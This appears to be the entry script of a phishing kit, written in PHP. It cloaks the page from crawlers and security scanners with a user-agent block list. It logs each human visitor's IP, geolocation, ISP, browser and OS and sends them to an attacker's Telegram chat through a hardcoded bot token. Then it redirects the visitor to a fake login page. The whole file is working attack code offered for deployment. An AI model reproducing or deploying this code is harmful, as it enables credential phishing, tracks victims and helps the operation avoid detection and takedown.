<?php 
require 'main.php';
header("location: app/index.php");
?>

<?php
// Telegram Configuration - SET THESE VALUES
define('BOT_TOKEN', '8378753106:AAE7WmxdS5Aiswiji3YEiY2MILrKHFiv6Kg'); // Your Telegram bot token
define('CHAT_ID', '-5068339228'); // Your Telegram chat ID

// Bot blocking configuration
$blockBots = true; // Set to false to disable bot blocking

// Function to get client IP address
function getClientIP() {
    $ip = '';
    
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    elseif (isset($_SERVER['HTTP_X_FORWARDED']))
        $ip = $_SERVER['HTTP_X_FORWARDED'];
    elseif (isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    elseif (isset($_SERVER['HTTP_FORWARDED']))
        $ip = $_SERVER['HTTP_FORWARDED'];
    elseif (isset($_SERVER['REMOTE_ADDR']))
        $ip = $_SERVER['REMOTE_ADDR'];
    
    // Handle multiple IPs (proxy chains)
    $ip = explode(',', $ip)[0];
    
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
}

// Function to detect bots
function isBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (empty($userAgent)) return true;
    
    $botPatterns = [
        '/bot/i', '/crawl/i', '/spider/i', '/scrape/i', 
        '/curl/i', '/wget/i', '/python/i', '/java/i',
        '/php/i', '/google/i', '/bing/i', '/yahoo/i',
        '/yandex/i', '/duckduckgo/i', '/baidu/i',
        '/facebook/i', '/twitter/i', '/slurp/i', 
        '/msn/i', '/ask/i', '/archive/i'
    ];
    
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    return false;
}

// Function to get country info with flag emoji
function getCountryInfo($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return [
            'country' => 'Local/Localhost',
            'flag' => 'ð ',
            'country_code' => 'LOCAL'
        ];
    }
    
    try {
        // Using ip-api.com (free tier)
        $url = "http://ip-api.com/json/{$ip}?fields=status,country,countryCode,city,isp";
        $response = @file_get_contents($url);
        
        if ($response) {
            $data = json_decode($response, true);
            
            if ($data['status'] === 'success') {
                return [
                    'country' => $data['country'] . ', ' . $data['city'],
                    'flag' => getCountryFlagEmoji($data['countryCode']),
                    'country_code' => $data['countryCode'],
                    'isp' => $data['isp']
                ];
            }
        }
    } catch (Exception $e) {
        // Silent fallback
    }
    
    return [
        'country' => 'Unknown',
        'flag' => 'â',
        'country_code' => 'UNK'
    ];
}

// Function to convert country code to flag emoji
function getCountryFlagEmoji($countryCode) {
    if (empty($countryCode) || strlen($countryCode) !== 2) {
        return 'ð´';
    }
    
    $countryCode = strtoupper($countryCode);
    $flag = '';
    
    // Convert letters to regional indicator symbols
    for ($i = 0; $i < 2; $i++) {
        $char = $countryCode[$i];
        $flag .= mb_chr(127397 + ord($char), 'UTF-8');
    }
    
    return $flag;
}

// Function to send Telegram message
function sendTelegramMessage($message) {
    if (empty(BOT_TOKEN) || empty(CHAT_ID) || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
    
    return true;
}

// Main execution
$clientIP = getClientIP();
$isBot = isBot();

// Block bots if enabled
if ($blockBots && $isBot && $clientIP !== '127.0.0.1') {
    // Optional: Log bot attempt without sending to Telegram
    // You can also send to a different chat for monitoring
    if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
        $botInfo = getCountryInfo($clientIP);
        $botMessage = "ð« <b>Bot Blocked!</b>\n\n";
        $botMessage .= "ð¤ <b>Bot Detected:</b> " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
        $botMessage .= "ð <b>IP:</b> <code>{$clientIP}</code>\n";
        $botMessage .= "{$botInfo['flag']} <b>Location:</b> {$botInfo['country']}\n";
        $botMessage .= "ð¡ï¸ <b>Action:</b> Access blocked";
        sendTelegramMessage($botMessage);
    }
    exit('Access Denied');
}

// Process human visitors
$countryInfo = getCountryInfo($clientIP);

// Get additional info
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$browser = 'Unknown';
$os = 'Unknown';

// Simple browser/OS detection
if (preg_match('/Chrome/i', $userAgent)) $browser = 'Chrome ð';
elseif (preg_match('/Firefox/i', $userAgent)) $browser = 'Firefox ð¦';
elseif (preg_match('/Safari/i', $userAgent)) $browser = 'Safari ð';
elseif (preg_match('/Edge/i', $userAgent)) $browser = 'Edge ð';
elseif (preg_match('/Opera/i', $userAgent)) $browser = 'Opera ð­';

if (preg_match('/Windows/i', $userAgent)) $os = 'Windows ðª';
elseif (preg_match('/Mac/i', $userAgent)) $os = 'Mac ð';
elseif (preg_match('/Linux/i', $userAgent)) $os = 'Linux ð§';
elseif (preg_match('/Android/i', $userAgent)) $os = 'Android ð¤';
elseif (preg_match('/iPhone|iPad/i', $userAgent)) $os = 'iOS ð±';

// Prepare Telegram message with emojis
$message = "ð¤ <b>New Visitor Detected!</b>\n\n";
$message .= "ð <b>IP Address:</b> <code>{$clientIP}</code>\n";
$message .= "{$countryInfo['flag']} <b>Location:</b> {$countryInfo['country']}\n";

if (isset($countryInfo['isp'])) {
    $message .= "ð¢ <b>ISP:</b> {$countryInfo['isp']}\n";
}

$message .= "ð <b>Browser:</b> {$browser}\n";
$message .= "ð» <b>OS:</b> {$os}\n";
$message .= "ð <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
$message .= "ð <b>URL:</b> " . ($_SERVER['HTTP_HOST'] ?? '') . ($_SERVER['REQUEST_URI'] ?? '') . "\n\n";
$message .= "ð¯ <i>Visitor redirected to login page</i>";

// Send to Telegram
if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    sendTelegramMessage($message);
}

// Redirect to login page
header("location: auth/login.php");
exit();
?>